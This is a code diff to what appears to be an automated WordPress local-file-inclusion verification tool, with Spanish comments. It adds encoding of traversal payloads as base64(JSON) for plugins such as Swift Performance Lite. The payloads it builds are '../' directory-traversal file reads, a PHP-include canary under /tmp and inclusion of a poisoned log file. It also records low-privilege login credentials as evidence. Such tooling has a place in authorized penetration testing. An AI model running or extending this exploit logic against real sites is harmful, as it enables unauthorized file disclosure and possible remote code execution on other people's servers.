@@ -4569,6 +4569,39 @@ def verify_wordpress_lfi(
         if _lfi_needs_admin and boot.admin_sess:
             step("endpoint bajo /wp-admin/ -- usando sesion de admin para LFI")
 
+        # ── base64 JSON parameter detection ──────────────────────────────
+        # Algunos plugins (ej. Swift Performance Lite) codifican la ruta como base64(JSON):
+        # data=base64('["template-part","null","PATH"]'). Detectar y envolver cada payload.
+        import base64 as _b64_lfi
+        import json as _json_lfi
+        _params_lfi_dict = parameters if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
+        _orig_lfi_val = _params_lfi_dict.get(path_param, "")
+        _b64_lfi_template = None
+        _b64_lfi_path_idx = 0
+        if isinstance(_orig_lfi_val, str) and _orig_lfi_val:
+            try:
+                _decoded_lfi = _b64_lfi.b64decode(_orig_lfi_val + "==").decode("utf-8", errors="strict")
+                _parsed_lfi = _json_lfi.loads(_decoded_lfi)
+                if isinstance(_parsed_lfi, list) and len(_parsed_lfi) >= 2:
+                    for _pi_lfi, _pv_lfi in enumerate(_parsed_lfi):
+                        if isinstance(_pv_lfi, str) and (".." in _pv_lfi or "/" in _pv_lfi):
+                            _b64_lfi_template = list(_parsed_lfi)
+                            _b64_lfi_path_idx = _pi_lfi
+                            break
+            except Exception:
+                pass
+
+        def _wrap_lfi_path(p: str) -> str:
+            if _b64_lfi_template is not None:
+                _t = list(_b64_lfi_template)
+                _t[_b64_lfi_path_idx] = p
+                return _b64_lfi.b64encode(_json_lfi.dumps(_t, separators=(",", ":")).encode()).decode()
+            return p
+
+        if _b64_lfi_template is not None:
+            step(f"[LFI] path_param='{path_param}' contiene JSON base64 (idx {_b64_lfi_path_idx}): "
+                 f"cada payload sera codificado como base64(JSON)")
+
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user,
             "login_bajo_privilegio_password": boot.sub_pass,
@@ -4582,7 +4615,7 @@ def verify_wordpress_lfi(
             if read_found:
                 break
             for prefix in traversal_prefixes:
-                payload_val = prefix + rel_path.lstrip("/")
+                payload_val = _wrap_lfi_path(prefix + rel_path.lstrip("/"))
                 payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                 payload[path_param] = payload_val
                 step(f"probando LFI de lectura: {path_param}={payload_val!r}...")
@@ -4629,7 +4662,7 @@ def verify_wordpress_lfi(
                 # Canario sin extension — PHP añade .php: /tmp/binoracle_canary_TOKEN
                 _php_lfi_bare = f"tmp/binoracle_canary_{_php_lfi_token}"
                 for _n_lfi in range(1, 13):
-                    _php_lfi_val = ("../" * _n_lfi) + _php_lfi_bare
+                    _php_lfi_val = _wrap_lfi_path(("../" * _n_lfi) + _php_lfi_bare)
                     _php_pl = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                     _php_pl[path_param] = _php_lfi_val
                     step(f"probando PHP-include canario: {path_param}={_php_lfi_val!r}...")
@@ -4691,7 +4724,7 @@ def verify_wordpress_lfi(
                 for n in depths:
                     log_payloads.append(("../" * n + rel) if n else lp)
 
-            for lp_val in log_payloads:
+            for lp_val in [_wrap_lfi_path(p) for p in log_payloads]:
                 payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                 payload[path_param] = lp_val
                 step(f"incluyendo log envenenado: {path_param}={lp_val!r}...")
